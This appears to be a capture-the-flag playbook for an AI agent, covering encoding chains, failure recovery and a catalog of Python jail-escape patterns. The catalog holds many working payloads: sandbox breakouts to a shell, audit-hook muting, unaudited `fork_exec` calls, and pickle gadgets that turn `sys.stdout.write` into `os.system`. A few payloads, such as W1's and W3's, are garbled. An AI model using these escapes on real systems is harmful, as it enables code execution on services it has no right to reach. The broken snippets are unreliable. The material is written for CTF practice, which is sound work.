   inner is a jail → Chain 1 from scratch (fresh `jail.json`, fresh benign
   ladder; never reuse the outer bypass spelling blind). If inner is a
   blob/QR → encoding/QR chain with per-layer round-trip verify. Verify:
   flag-pattern grep + wrong-password control still fails.
### Chain 3 — encoding outer → esolang/VM inner → flag grep
1. Outer decode (local only): magic-order strip of QR/b64/hex/rot layers,
   re-encode verify per layer, cap 6 layers. Verify: each layer's magic
   (`file`/`xxd`) matches the next decoder's expectation.
2. Inner run (local only): decoded bytes should be esolang source or VM
   bytecode (alphabet/grid/opcode histogram check). Run via the
   interpret-and-run loop (A3) or VM emulator stub (A4) with timeout 30.
   Trivial-program test FIRST if the semantics are uncertain. Verify:
   interpreter output is printable text, not raw bytes.
3. Grep + handoff: single flag-pattern grep, `flagpath.json` records BOTH
   the decoder chain AND the interpreter variant. Verify: wrong-layer
   decode control fails (proves the chain order matters).
`Reasoning Checkpoint`: chain evidence (per-link verify pass/fail + artifact
paths) -> route (advance one link vs stop/re-classify) -> next (gated inner
shot only after outer verify passes).
## Failure-Mode Catalog + Recovery (detect → recover, 1 retry each)
| # | Failure (signal) | Detection (how you know) | Recovery (bounded) |
|---|---|---|---|
| F1 | Audit hook kills `open`/read (block message or silent empty on any read spelling) | `open('nonexistent')` probe returns hook text; TWO different read spellings both die while `().__class__` echo still works | Memory-only exfil: pivot to error-message channel — `help(*open('flag.txt'))`-style stderr echo, `exit(set(open(...)))` set-print, `compile('.','flag','exec')` stderr leak, or `str()`-wrap inside `repr` echo. Local-test the channel on a dummy file first; ONE live shot. If all read events are hooked, reconstruct names at runtime (A1.2) or hand off. |
| F2 | No output channel (payload runs but nothing returns; blind jail) | Benign `1+1` returns nothing/timeout; error text identical for good/bad input; socket closes without echo | Timing/blind exfil: boolean oracle per char — expression that sleeps/errors ONLY if `flag[first]==c` (e.g. conditional `__import__('time').sleep` if reachable, else exception-vs-silence branch). Alphabet-fixed loop in `solve.py`, one char per 1-2 probes, cap 200 probes total; else mark `blocked` and hand off with the oracle evidence. Never infinite-loop blind brute. |
| F3 | Blacklist regex eats the payload (generic "blocked"/"bad" on many inputs, even benign-looking ones) | Blocked-word control fires on substrings (`import` inside innocent words); `getattr` spelling passes where raw word fails | Encoding ladder: escalate spelling ONE rung — concat → `chr()` → format-string → hex/unicode-escape → codec-decode-at-runtime. After each rung, re-check with the SINGLE blocked token only. Cap 3 rung upgrades; if the regex blocks `chr/getattr/format` themselves, use `__getattribute__`/`__dict__`/`vars()` synonyms (one alternate), then stop and hand off. |
| F4 | Seccomp/namespace kills exec (`system/popen` dies, read still alive or all syscalls die) | `os.system('id')`-class payload times out/killed while ladder echo works; or banner warns "no exec" | ORW-only play: drop every `system/popen/exec` spelling; pure `open/read` (or `os.open/os.read`) via ladder with no new-process event. If reads ALSO die under seccomp, do not craft shellcode in this skill — package the filter evidence and escalate to `/pwn` (ORW ROP context) per Escalation Triggers. |
| F5 | Esolang/VM mis-spec (output garbage or crash on challenge file, trivial program also fails) | Hello-test equivalent FAILS locally before the challenge file is ever run | Fix the interpreter, not the input: vary exactly one semantic (cell width mod-256 vs unbounded; EOF 0 vs -1; befunge wrap on/off; VM step-cap/halt op) and re-run trivial. Cap 3 variants; on the 3rd failure escalate to `/rev` with the variant matrix + sample outputs. Never hand-edit the challenge bytecode to "fit" the interpreter. |
| F6 | Socket/PoW stall (banner changed, disconnects, PoW never verifies, rounds exceed 200) | `oracle.json`/`pow.json` spec mismatches output; 2 reconnects exhausted; per-recv 8s timeouts stack up | Re-baseline once: single fresh banner read, re-derive spec (hex-vs-bits, charset, round format). One corrected `solve.py` run. If it still stalls, mark `blocked` with `service.txt` + round log; escalate to operator only if the service itself is down (not on logic bugs). |
Rules: each failure gets EXACTLY one corrected retry + one alternate method
(F-section wording), then `blocked` after 3 total failed shots. Log the
detection signal verbatim in `flagpath.json` so the validator can replay the
diagnosis, not just the payload.
`Reasoning Checkpoint`: failure evidence (signal + which F-row matched) ->
route (single retry vs alternate vs blocked-handoff) -> next (Phase 5 handoff
with diagnosis on stop).
## Version-Drift Guards
Python and tool versions silently change jail behavior. Pin versions in
`flagpath.json` and test locally on the SAME minor before any live shot.
- Python 3.8 vs 3.11+: `sys.addaudithook` coverage widened (more events
  hooked in 3.11+; payloads that worked on 3.8 die on `open`/`compile` in
  3.11+). `ExceptionGroup`/`except*` syntax exists only 3.11+ (do not send
  it to a 3.8 jail). `AttributeError.obj` attribute (3.10+) and
  `sys._getframe` availability vary — never assume frame tricks portably.
  `str.format` mini-language and `__getattribute__` semantics are stable —
  prefer them over version-fragile unicode-identifier tricks.
- Opcode/blacklist drift: `compile()`/`ast` literal handling and f-string
  tokenization changed across 3.8→3.12 (f-string grammar is tokenizer-level
  in 3.12+). A filter that blocks `(` on 3.8 may need different getattr
  spelling on 3.12. Confirm with `python3 --version` on the REMOTE banner
  (often leaked) or match the Dockerfile/interpreter hint; when in doubt,
  build the ladder against 3.11 semantics (most common in 2025-2026 CTFs)
  and note the assumption.
- Tool flag drift: `zbarimg --raw/--quiet/--set` stable; `convert` (Image
  Magick 6) vs `magick` (v7) binary name differs — try `magick` fallback if
  `convert` is missing. `fcrackzip -D -p/-b -c/-l/--use-unzip` stable;
  `7z l/x -p -o` stable. `pyzbar`/`PIL` import names vary by env
  (`pyzbar.pyzbar.decode` vs `pyzbar.decode`) — probe import locally once.
  Record every tool's `--version` (or `python3 --version`) in the handoff.
- Guard procedure: `local_ladder.py` and interpreter stubs assert
  `sys.version_info` at startup and refuse to validate cross-minor payloads
  silently — mismatch → rebuild locally in a matching container
  (`Dockerfile.kali-ctf` baseline) before the gated shot.
`Reasoning Checkpoint`: version evidence (local vs remote minor + tool
versions match/mismatch) -> route (fire vs rebuild-locally first) -> next
(gated shot only on match).
## Time-Budget Tiers (hard stops per tier, then escalate or hand off)
| Tier | Budget | Scope in this skill | Stop rule |
|---|---|---|---|
| Easy | <=10 min | Single-subtype (plain jail, single-layer encode, QR-direct, zip-dict-first-try) | Solved or first F-row retry fails → hand off with `subtype.json` + probe log. No VM/polyglot work. |
| Medium | <=30 min | Blacklist jail (<=3 rung ladder), 2-3 layer encode, nested zip depth<=3, socket quiz without PoW | Two F-row recoveries exhausted or probe count hits 25 → hand off. One PoW solve allowed. |
| Hard | <=90 min | Hardened jail (audit hook + no-builtins), esolang+encode chain, polyglot, custom-VM <=32 ops, PoW+quiz socket, blind-oracle exfil | Full chain attempted once + one retry + one alternate; probe cap 30 hard; archive depth 5; socket rounds 200. On expiry → `blocked` handoff with per-link evidence regardless of "almost there". |
| Insane | escalate | Anything beyond Hard (64+ op VM with crypto, multi-service chains, kernel/seccomp escapes needing ROP) | Do NOT burn >90 min here. Package `jail.json`/`oracle.json`/`pow.json`, handler notes, variant matrix, and elapsed; escalate per triggers below. Continued grinding without new evidence is a stop signal, not persistence. |
Global stops (any tier): `timeout 120` kills any single runaway step; total
jail inputs <=30; encoding layers <=6; no second full-brute after the first
bounded brute fails. Timer starts at Phase 1 triage, not at Phase 4.
`Reasoning Checkpoint`: budget evidence (elapsed vs tier + probes spent) ->
route (continue within tier vs escalate/handoff) -> next (stop with package
on expiry).
## Escalation Triggers (when this skill STOPS and who gets the package)
- To `/rev` (VM/binary work): custom-VM handler count >~32 ops, packed or
  self-modifying bytecode, crypto inside handlers (xor-with-key streams,
  AES-like tables), or F5's 3 interpreter variants all failed. Package:
  VM binary + bytecode + handler notes + opcode histogram + emulator stub +
  variant matrix. Do not keep guessing opcodes past 30 min static.
- To `/crypto` (encoded layers): 3+ nested cipher layers with keys (vigenere
  with unknown key + railfence + transposition), RSA/AES-looking blobs, or
  hash-puzzle specs that are really proof-of-decryption. Package: full blob
  + per-layer magic notes + tried key caps (<=200 evidence) + `chain.py`.
- To operator (human gate): nothing typical works after the full
  Phase 1-4 + one F-row retry + one alternate; service down/unreachable;
  scope ambiguity (flag path outside jail root with no read primitive);
  unbounded-brute demand (keyspace clearly >200 with no oracle); any
  destructive/out-of-scope action needed. Use the hard-gate ping with the
  exact need, keep solving unblocked sibling work. Package: everything
  (`jail.json`, probe matrix, F-row diagnosis, elapsed, tier).
- Never escalate on first failure: each trigger requires the named evidence
  (counts/matrices above), not a feeling. A premature `/rev` handoff with
  no handler notes will bounce back.
`Reasoning Checkpoint`: escalation evidence (trigger condition met with
counts) -> route (named recipient + package list) -> next (release slot).
## Worked End-to-End Example (abstract generic jail — technique only)
Scenario: a socket jail prints a banner naming banned words, reads one line,
`eval`s it with stripped builtins, prints `repr(result)`, 5s timeout. No
real service, no real flag — abstract pattern only.
1. Baseline (60s, local/2 probes): read the provided jail source fully;
   write `jail.json` {entry: `eval(input())`, blacklist: [blocked words],
   builtins: stripped, hook: none seen, goal: read file at hinted path}.
   `file`/`xxd` confirm it is a `.py` jail, not a binary.
2. Confirmation (benign only): send `7*7` → expect `49` (proves eval sink);
   send `().__class__` → expect class-tuple echo (proves attribute walk).
   Send the blocked word alone → expect filter message (names the filter).
   No `open`/`import` strings sent in this phase.
3. Negative: send plain `hello` → expect literal echo or benign error
   (control, must differ from filter message). Decode the wrong way
   (treat echo as hex) → must fail (proves classifier, not luck).
4. Local ladder (zero live probes): on the matching Python minor,
   enumerate `''.__class__.__mro__[1].__subclasses__()`, find the file-like
   INDEX, compose the getattr/chr spelling, `ast.parse` it, execute against
   a LOCAL dummy file — expect dummy content back. Only this validated
   string is eligible for the wire. Wrap with `str(...)` because the jail
   prints `repr()`.
5. Gated exploit (ONE shot, `timeout 120`, actually ~5s): send the single
   validated read expression. Expect printable file content in the reply.
   `grep -E -o` the flag FORMAT (regex only, e.g. `(flag|FLAG|CTF)\{[^}]{1,200}\}`);
   record match yes/no without pasting any flag value anywhere.
6. Validation-handoff: save raw output to
   `artifacts/misc/flagpath_jail.txt`; write `flagpath.json` {subtype:
   pyjail, entry, payload class `subclasses-ladder`, spelling class
   `getattr-chr`, tool/python versions, elapsed, probe count}; replay
   WITHOUT payload (plain input) and confirm no flag (causality). Hand off
   category `misc`, confidence, artifact paths, exact replay command. Done —
   no second shot, no live brute, no flag value in chat or logs beyond the
   saved artifact.
`Reasoning Checkpoint`: example-trace evidence (each phase's verify) ->
route (validate/handoff) -> next (writeup; done).
## References (repos / docs only)
- Python docs: `codecs`, `base64`, `binascii`, `zlib`, `ast`, `pickletools`
- `zbar-tools` man page (`zbarimg --raw`, `--set`, `--quiet`)
- `fcrackzip` man page (`-D -p`, `-b -c a1 -l`, `--use-unzip`)
- `github.com/Paradoxis/Flask-Unsign` (session-cookie adjacent)
- `github.com/ffuf/ffuf` wordlist conventions (SecLists paths only)

## Writeup-Distilled Patterns (W1..W36)
Each pattern is NEW relative to sections above: name → recognition signals →
exact steps → payload → pitfalls → sources. Local-test every payload against a
matching-minor copy before the gated shot. Technique-only, no flag values.
### W1. help()-prompt module loader (zero-arg call jails)
- Signals: `()` allowed but empty-only (regex `([^()]|\(\))*`), no builtins, `__subclasses__` reachable, `help`/`Helper` present.
- Steps: 1) locate `_sitebuiltins._Helper` INDEX locally; 2) invoke `...__subclasses__()[H]()()` to enter `help>` prompt; 3) type module name (`code`, `pdb`, `sys`) + `quit`; 4) its classes now appear in `__subclasses__` — walk to `InteractiveConsole().interact()` or `sys.modules[...]` reader.
- Payload: `[a:=().__class__.__base__.__subclasses__()](HELPER)(),a()[-3].__subclasses__()0.interact()` (INDEX/discovery local; ordering is version-specific).
- Pitfall: INDEX shifts per minor — never hardcode remote INDEX; help prompt consumes TWO inputs (`modulename`, then `quit`) so budget 2 probes for the sequence.
- Sources: https://jia.je/ctf-writeups/misc/pyjail/seccon-2024-quals-1linepyjail.html, https://github.com/mmm-team/public-writeups/blob/d592f318b5daa813b89d4b1bae323862fda911de/seccon2024/jail_1linepyjail/README.md
### W2. code.InteractiveConsole REPL escalation
- Signals: W1 succeeded (help prompt reachable) or `code` already in `sys.modules`.
- Steps: 1) after help-loading `code`, find `code.InteractiveConsole` in fresh `__subclasses__` listing; 2) call zero-arg `.interact()`; 3) cleartext `import os` + `os.system('sh')` inside REPL (REPL input is NOT filtered).
- Payload: `...__subclasses__()[H]()()` then `code`, `quit`, then subclass-walk to `InteractiveConsole().interact()`.
- Pitfall: REPL still subject to audit hooks process-wide — if `open`/`system` hooked, combine with W17/W18 instead of plain system.
- Sources: https://jia.je/ctf-writeups/misc/pyjail/uoftctf-2024-jail-zero.html, https://jia.je/ctf-writeups/misc/pyjail/seccon-2024-quals-1linepyjail.html
### W3. pdb.set_trace via sys.modules reuse
- Signals: `sys` reachable via Printer `__init__.__globals__`, `pdb` loadable through help prompt.
- Steps: 1) help-load `pdb`; 2) `Printer.__init__.__globals__['sys'].modules['pdb'].set_trace()`; 3) at `(Pdb)` run the os-system ladder as debugger input.
- Payload: `...__subclasses__()[P].__init__.__globals__['sys'].modules['pdb'].set_trace()`.
- Pitfall: `(Pdb)` prompt parsing differs from jail prompt — send payload, then `recvuntil(b'(Pdb) ' RangeError` handling (8s timeout, 2 tries).
- Sources: https://jia.je/ctf-writeups/misc/pyjail/seccon-2024-quals-1linepyjail.html
### W4. Unicode-identifier bypass (incl. FULLWIDTH LOW LINE)
- Signals: filter bans `[a-zA-Z]`, digits, or `__` literally; Python ≥3.8 parser on remote.
- Steps: 1) map each ASCII letter to Mathematical Alphanumeric block (`a`→U+1D41A-ish for lower, U+1D400-ish for upper); 2) replace one `_` of every `__` with FULLWIDTH LOW LINE U+FF3F; 3) `ast.parse` locally — identifiers must tokenize as NAME; 4) digits via `(''=='')`-as-1 arithmetic (see W6).
- Payload: `().__class__...` fully remapped, e.g. `().__＿...` form validated by local parse.
- Pitfall: NFKC-normalizing jails (pygolf/pycryptojail families) collapse these back to ASCII — probe with one identifier first; if normalized, switch to W5/W11.
- Sources: https://jia.je/ctf-writeups/misc/pyjail/uoftctf-2024-jail-zero.html, https://jia.je/ctf-writeups/misc/pyjail/b01lers-ctf-2023-blacklisted.html
### W5. Helper-docstring char synthesis (quoteless strings)
- Signals: quotes/brackets restricted but attribute read + indexing allowed; `help_text = Helper.__doc__` reachable.
- Steps: 1) exfil `Helper.__doc__` once; 2) locally record index of each needed char (`s,y,s,t,e,m,h,o,c,d`…); 3) build `S[i]+S[j]…` via `__add__` chains or subscript synthesis to spell `sys`, `os`, `sh` with zero literals.
- Payload: `S:=Helper.__doc__` then `s:=S[IDX_s]` … `system:=…__add__…-chain`.
- Pitfall: docstring differs per Python minor — extract indices from the REMOTE docstring, never from local text.
- Sources: https://github.com/jiegec/ctf-writeups/blob/master/docs/misc/pyjail/tcp1p-ctf-2023-pymagic.md, https://jia.je/ctf-writeups/misc/pyjail/tcp1p-ctf-2024-typically-not-a-revenge.html
### W6. True-arithmetic + bool-slice indexing (no-digit jails)
- Signals: digits banned; `True`/`False` or comparisons available.
- Steps: 1) `True`≙1 via `[[]]>[]`, `[]==[]`, or `()<((),)`; 2) N via `True+True…` or `-~x` chaining; 3) indices via bool slices: `[0]`≙`[[]is[]]`, `[1]`≙`[not[]is[]]`, `[k]`≙`[not[]is[]:]*…+[not[]is[]]`; 4) lengths via `'aa'.__len__()`-style where needed.
- Payload: `arr[not[]is[]]` for `arr[1]`; `-~(-~x)` for `x+2`.
- Pitfall: `len(set(input))<=N` charset caps (ok-nice family) — reuse the SAME `True`/slice spellings, count distinct chars locally before sending.
- Sources: https://jia.je/ctf-writeups/misc/pyjail/imaginaryctf-2024-ok-nice.html, https://jia.je/ctf-writeups/2025-08-16-scriptctf2025/modulo.html
### W7. __class_getitem__/__getitem__ call trampoline (no-parens jails)
- Signals: `(`/`)` banned but `[]` + assignment (or comprehension rebinding) allowed.
- Steps: 1) pick a mutable class (`ExceptionGroup`, custom `class E(dict)`); 2) rebind `Cls.__class_getitem__ = TARGET_FN` (via `=` or comprehension form); 3) invoke as `Cls[ARG]` — subscript dispatches the call with no parens.
- Payload: `[None for ExceptionGroup.__class_getitem__ in [FN]]` then `ExceptionGroup[ARG]`.
- Pitfall: slot-wrapper getitems (list/tuple) are read-only — verify rebinding locally with the exact class; prefer `ExceptionGroup`/dict-subclass.
- Sources: https://jia.je/ctf-writeups/misc/pyjail/jailctf-2025-impossible.html, https://github.com/jailctf/challenges-2024/blob/master/get-and-call/solve/README.md
### W8. Spaceless/equalsless assignment idioms
- Signals: space and/or `=` banned; `eval` context (no statements).
- Steps: 1) walrus `[a:=EXPR]` if `=` allowed but statements barred; 2) else comprehension binder `[[]for[a]in[[EXPR]]]`; 3) chain `for a in [b] for c in [d]` for multi-assign; 4) replace remaining spaces with `\f`/`\r`/`\x0c`.
- Payload: `[[help[quit[license]]]for[help.__class__.__getitem__]in[[eval]for[quit.__class__.__getitem__]in[[input]]]]`.
- Pitfall: `\r` vs `\n` matters to `input()`-based readers — test which line-break survives locally first.
- Sources: https://jia.je/ctf-writeups/misc/pyjail/jailctf-2025-impossible.html, https://medium.com/@yoavsh97/jailctf-2025-impossible-writeup-864af327045f
### W9. Decorator-call chains + CR newlines
- Signals: calls banned (`(`/`)` or names), but `exec`+multiline accepted; `[\n=]` filtered.
- Steps: 1) stack decorators `@exec @input class A: pass` (each decorator calls below with the class object); 2) join lines with `\r` instead of `\n`; 3) extend to `@print @set @open @input` chains for read-then-print.
- Payload: `@exec\r@input\rclass\x0ca:pass` (exact whitespace bytes per filter).
- Pitfall: AST `Name`-in-input checks kill this — then combine with W4 unicode identifiers.
- Sources: https://jia.je/ctf-writeups/misc/pyjail/jailctf-2024-no-nonsense.html, https://jia.je/ctf-writeups/misc/pyjail/b01lers-ctf-2023-blacklisted.html
### W10. match-case attribute extraction
- Signals: attribute dots/names filtered but `match` statement allowed (exec context).
- Steps: 1) `match str(): case str(join=join):` captures the `join` method with no dot-spelling of the access; 2) build `%c` (W11), then words; 3) `match vars(): case dict(get=get):` similarly captures `dict.get` for staged lookups.
- Payload: `match str():\n case str(join=join):\n bfc=join(list((chr(37),chr(99),)))`.
- Pitfall: `match` is exec-only — useless in `eval(input())` sinks; confirm sink kind (Phase 2 `7*7` vs statement probe) first.
- Sources: https://newstar.wiki/wp/2024/week5/misc/pyjail, https://github.com/jailctf/pyjail-collection
### W11. %-format string synthesis
- Signals: only `%` operator + one allowed letter (e.g. `c`), or `%c` reachable.
- Steps: 1) build format verb `bfc='%c'` from `chr(37)+chr(99)`; 2) repeat verb (`bfc*12`) and interpolate codepoints (`bfc%(95,95,98,…)` → `__builtins__`); 3) use built names for getattr/import/system words.
- Payload: `buil=bfc*12; buil=buil%(95,95,98,117,105,108,116,105,110,115,95,95)`.
- Pitfall: count the verb multiplier exactly (12 verbs ↔ 12 codepoints) — mismatch raises locally-testable TypeError; verify locally.
- Sources: https://newstar.wiki/wp/2024/week5/misc/pyjail, https://jia.je/ctf-writeups/2025-08-16-scriptctf2025/modulo.html
### W12. __getattr__-rebind import (stringless import)
- Signals: no quotes/strings, no parens (W7 available), need `os`.
- Steps: 1) `SomeObj.__class__.__getattr__ = __import__` (via comprehension binder); 2) attribute fetch `SomeObj.os` now calls `__import__('os')` — the attribute NAME is the string, never quoted.
- Payload: bind then `copyright.os` / `copyright.os.system` chains.
- Pitfall: rebinding `__getattr__` on a shared builtin class pollutes later lookups — do it on a throwaway object, last step before use.
- Sources: https://jia.je/ctf-writeups/misc/pyjail/jailctf-2025-impossible.html, https://jia.je/ctf-writeups/misc/pyjail.html
### W13. Single-dot budget (lambda-held getattribute)
- Signals: at most ONE `.` in input (jailCTF `one` family).
- Steps: 1) spend the dot on `value.__getattribute__` captured into a lambda parameter/default; 2) every further `a.b` becomes `get(a,'b')` with NO dots; 3) finish via `__setattr__.__objclass__` subclasses → system.
- Payload: `().__setattr__.__objclass__.__subclasses__()[I].__init__.__globals__['system']('sh')` reached through one stored getter.
- Pitfall: string quotes still needed for names — if quotes ALSO banned, stack with W5 first.
- Sources: https://jia.je/ctf-writeups/misc/pyjail/jailctf-2025-one.html
### W14. Length/prime/collatz identifier shaping
- Signals: word-length constraints (prime-only, collatz chains, increasing lengths).
- Steps: 1) list required dunders; 2) pad with `[value][000…]` subscripts, `\xXX` escapes, or `__len__`-derived filler to hit legal lengths; 3) verify each token length with a local checker before sending.
- Payload: `().__reduce_ex__(2)[0].__globals__[…]` + `\xXX` short-words for `primal`-style filters.
- Pitfall: escapes count as source chars, not runtime chars — measure the WIRE form, not the evaluated form.
- Sources: https://jia.je/ctf-writeups/misc/pyjail/jailctf-2025-primal.html, https://jia.je/ctf-writeups/2026-07-25-jailctf-2026/collatz.html
### W15. popitem/reversed last-item traversal
- Signals: only no-arg calls + arbitrary getattr allowed (get-and-call family); need `help`/`breakpoint`/`system` without indexing literals.
- Steps: 1) `dict.values().__reversed__().__next__()` grabs the LAST dict value (often `help`/`breakpoint`); 2) `list.__reversed__().__next__()` grabs last list item; 3) `__reduce__`-then-`__self__` on iterators as alternate builtins source.
- Payload: `__builtins__.values().__reversed__().__next__()` to land the final entry.
- Pitfall: dict order = insertion order per build — confirm WHICH builtin is last on the matching minor locally.
- Sources: https://github.com/jailctf/challenges-2024/blob/master/get-and-call/solve/README.md, https://zenn.dev/tchen/articles/5c446d9dbd9920
### W16. Exception/generator/async frame recovery
- Signals: `__globals__`/`sys` words banned but tracebacks, generators, or `async` allowed.
- Steps: 1) `try:1/0 except Exception as e:` → `e.__traceback__.tb_frame.f_back.f_globals/f_builtins`; 2) or `(x for x in ()).gi_frame.f_globals/f_builtins`; 3) or `async def a():pass` → `a().cr_frame.f_globals`; 4) `help.__call__.__globals__['sys'].modules['_signal']` variant for signal frames.
- Payload: `'{0.gi_frame.f_globals}'.format((x for x in ()))` for quoteless/format-filtered variants.
- Pitfall: `tb_frame`/`gi_frame` may be audited (`sys._getframe` family) — prefer tracebacks that ARRIVE via exception rather than fetched via blocked calls.
- Sources: https://jia.je/ctf-writeups/misc/pyjail/tcp1p-ctf-2024-typically-not-a-revenge.html, https://github.com/salvatore-abello/python-ctf-cheatsheet/blob/main/pyjails/README.md
### W17. Signal-frame audit-hook mute (closure cell overwrite)
- Signals: `sys.addaudithook` kill-hook + `compile(..., 'eval')` expression-only sink; `_signal` already imported (frozen).
- Steps: 1) `s:=__import__('sys').modules['_signal']`; 2) `s.signal(N, lambda n,f: f.f_back.f_locals['hook'].__closure__[0].__setattr__('cell_contents', SAFE_FN))`; 3) `s.raise_signal(N)`; 4) proceed with `os.system`/read — hook now calls a no-op; prefix `0,`/`1,` to satisfy numeric-regex gates.
- Payload: `0,(s:=__import__('sys').modules['_signal']),s.signal(2,lambda n,f:f.f_back.f_locals['hook'].__closure__[0].__setattr__('cell_contents',chr)),s.raise_signal(2),open('flag.txt').read()`.
- Pitfall: closure INDEX is the hook's first free var (`exit`) — verify `__closure__` layout against the published jail source, not by guessing; signal numbers audited on some builds — try 1/2 locally first.
- Sources: https://jia.je/ctf-writeups/misc/pyjail/imaginaryctf-2024-calc.html, https://blog.antoine.rocks/%F0%9F%91%A9%E2%80%8D%F0%9F%8F%ABwriteups/ictf%202024%20-%20all%20pyjails/
### W18. ctypes audit-head nulling (C-level hooks)
- Signals: C-registered hook (`PySys_AddAuditHook`) surviving W17; `ctypes` reachable or loadable.
- Steps: 1) locate head via published offsets: Python-hook → Interp `audit_hooks` from `ctypes.byref(ctypes.py_object(()))`; C-hook → `_PyRuntime.audit_hooks.head`; 2) cast to list-object and pop, or rewrite head to NULL; 3) verify with a previously-killed benign event before the real payload.
- Payload: per-version offset script (see finder below) — never hand-rolled blind.
- Pitfall: offsets are minor+build-specific (3.8 vs 3.11+ differ); UAF-bytearray variant (bytearray.__index__) exists when ctypes is blocked but subscription is allowed — both need exact-minor local rehearsal.
- Sources: https://maplebacon.org/2024/02/dicectf2024-irs/, https://github.com/Nambers/python-audit_hook_head_finder
### W19. _posixsubprocess.fork_exec unaudited exec
- Signals: audit hook kills `system/popen/exec` but `_posixsubprocess` importable or preloaded.
- Steps: 1) reach `__builtins__.__loader__.load_module('_posixsubprocess')` or the module object; 2) call `fork_exec([b'/bin/cat',b'flag.txt'],…,*)` with `os.pipe()` fds; 3) read back through the pipe — no `exec`-family audit event fires on the low-level path.
- Payload: `__builtins__.__loader__.load_module('_posixsubprocess').fork_exec([b"/bin/cat",b"flag.txt"],[b"/bin/cat"],True,(),None,None,-1,-1,-1,-1,-1,-1,*(__import__('os').pipe()),False,False,None,None,None,-1,None)`.
- Pitfall: 17-arg signature is exact — one wrong fd/flag segfaults silently; build the tuple locally and count twice.
- Sources: https://github.com/salvatore-abello/python-ctf-cheatsheet/blob/main/pyjails/README.md, https://cp04042k.github.io/posts/imaginaryctf-2024/
### W20. __loader__/BuiltinImporter unaudited import
- Signals: `import` statement/event blocked but `__loader__` attribute visible on modules/builtins.
- Steps: 1) `__loader__.load_module('os')` / `create_module(spec)` for builtin modules; 2) on 3.12 paths this skips the `import` audit event; 3) fall back to `sys.modules` reuse (no new import at all) when even the loader is watched.
- Payload: `().__class__.__base__.__subclasses__()[BUILTINIMPORTER].load_module('os').system('sh')` (INDEX local).
- Pitfall: `load_module` is deprecated/removed on newest minors — check `hasattr` behavior on the matching version first.
- Sources: https://github.com/maple3142/My-CTF-Challenges/blob/master/TSJ%20CTF%202022/Just%20a%20pyjail/README.md, https://jia.je/ctf-writeups/misc/pyjail/tcp1p-ctf-2024-typically-not-a-revenge.html
### W21. LOAD_GLOBAL_BUILTIN + CALL_BUILTIN_CLASS bytecode call
- Signals: pyc-jail synthesizing bytecode; normal CALL/LOAD_GLOBAL filtered or unavailable.
- Steps: 1) emit `LOAD_GLOBAL_BUILTIN` for `breakpoint`; 2) pad trash to alignment; 3) `CALL_BUILTIN_CLASS`; 4) force controlled exception after (`UNPACK_SEQUENCE_LIST`/unknown opcode) to avoid segfault paths and land in a catchable state.
- Payload: `bytes([111,1, 6*8, 29,0, 6*6, 191,0])` shape (opmap per minor).
- Pitfall: opcode numbers drift per minor (3.9 vs 3.11+ adaptive) — assemble from the LOCAL `dis.opmap`, never copy numbers across versions.
- Sources: https://github.com/salvatore-abello/python-ctf-cheatsheet/blob/main/pyjails/README.md
### W22. LOAD_FAST OOB read → code-object overwrite
- Signals: `CodeType(...)`-construction jail with attacker-influenced `co_code` (VOID/awpcode family).
- Steps: 1) craft `co_code` with OOB `LOAD_FAST` index to read adjacent stack/locals; 2) chain `UNPACK_EX/BUILD_TUPLE/SWAP/COPY/CALL` gadgets to morph into `input()`→`exec()` flow; 3) V2 (truncated-hex-input variant): `KW_NAMES/RESUME/PUSH_NULL/LOAD_FAST/PRECALL/CALL` prefix + padding + trailing conditional RCE text.
- Payload: assembler emitting `RESUME,LOAD_CONST,UNPACK_EX,BUILD_TUPLE,POP_TOP,SWAP,…,CALL(input),…,CALL(exec),RETURN_VALUE` (see sources for full builder).
- Pitfall: `co_code` length caps (e.g. 176 hex chars) — the V1/V2 choice depends on whether input is truncated BEFORE `bytes.fromhex`; read the jail source line, not the description.
- Sources: https://github.com/salvatore-abello/python-ctf-cheatsheet/blob/main/pyjails/README.md, https://blog.splitline.tw/hitcon-ctf-2022/
### W23. Pickle BUILD → persistent_load / stdout.write trampoline
- Signals: REDUCE/NEWOBJ/INST/OBJ banned, BUILD + GLOBAL allowed (SafePickle family).
- Steps: 1) `BUILD` arbitrary `__dict__` updates (bypasses `__setattr__` guards); 2a) set `Unpickler.persistent_load = <single-arg-fn>` then `BINPERSID/NEXT_BUFFER` to call it; 2b) or set `sys.stdout.__dict__['write'] = os.system` and RETURN a command string — the server's own `print()` executes it; 2c) or `license._Printer__setup = code.interact` + `print(license)`.
- Payload: `GLOBAL sys/stdout + DICT{'write':os.system} + BUILD + STRING('cat flag.txt') + STOP`.
- Pitfall: `find_class` allowlists still gate GLOBAL — stage W24's `__main__` overlay first when `os`/`sys` modules are unreachable.
- Sources: https://mirr-x.hashnode.dev/safepickle-ctf-writeup, https://jia.je/ctf-writeups/misc/pyjail/sekai-ctf-2023-just-another-pickle-jail.html
### W24. Pickle __main__-overlay + find_class swap
- Signals: `find_class` restricted to `__main__`/app with substring blacklist.
- Steps: 1) `BUILD __main__.__dict__` with `__builtins__` mapping (copies builtins into reachable namespace); 2) overwrite `SecureUnpickler.find_class = builtins.get` (or `__setstate__ = eval`) via BUILD tuples; 3) trigger with a second BUILD carrying the command string; 4) STACK_GLOBAL + `TUPLE1` + REDUCE staging for `__globals__.get/update` relocation when only one module is importable.
- Payload: PROTO/GLOBAL(`__main__`,`__builtins__`)/DICT/BUILD overlay, then BINGET-chained `find_class` swap (see sources for byte layout).
- Pitfall: memo/BINPUT indices must match emission order — disassemble with `pickletools.dis` locally and diff against the failing payload.
- Sources: https://cp04042k.github.io/posts/ictf-2023/, https://avan.sh/posts/were-pickle-phreaks-revenge/
### W25. _Printer__setup breakpoint swap
- Signals: `license`/`help` objects present, `breakpoint` name banned but reachable as a value.
- Steps: 1) `license._Printer__setup = breakpoint` (or `sys.breakpointhook` via W15 traversal); 2) `str(license)` / `print(license)` triggers the debugger; 3) debugger input runs unfiltered.
- Payload: `license._Printer__setup=breakpoint` then any stringification of `license`.
- Pitfall: name-mangled attr is version-stable but object must be the REAL `license` singleton — rebinding a copy silently no-ops.
- Sources: https://jia.je/ctf-writeups/misc/pyjail.html, https://github.com/jailctf/challenges-2024/blob/master/get-and-call/solve/README.md
### W26. Symbol-starved synthesis (%c-only / no-dot)
- Signals: lowercase allowlist tiny (e.g. only `c`), only `%` operator, or no `.` at all.
- Steps: 1) `"%c%c"%(97,98)` builds arbitrary two-char strings; 2) `getattr(A,"B")` replaces every dot; 3) `()<((),)`≙1 with `-~x` counting (see W6).
- Payload: `getattr(A,"%c%c"%(104,105))` style for `A.hi`.
